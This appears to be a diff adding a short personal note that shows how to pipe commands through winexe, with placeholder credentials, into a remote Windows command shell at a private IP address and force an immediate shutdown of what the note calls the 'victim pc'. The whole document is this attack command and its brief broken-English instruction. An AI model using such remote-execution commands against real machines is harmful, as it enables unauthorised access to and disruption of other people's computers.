@@ -1,0 +1,6 @@
+
+cat | winexe -U 'user%password' //192.168.2.20 cmd <<EOF
+> shutdown /s /t 00
+> EOF   
+
+finished EOF command than press enter shutdown victim pc
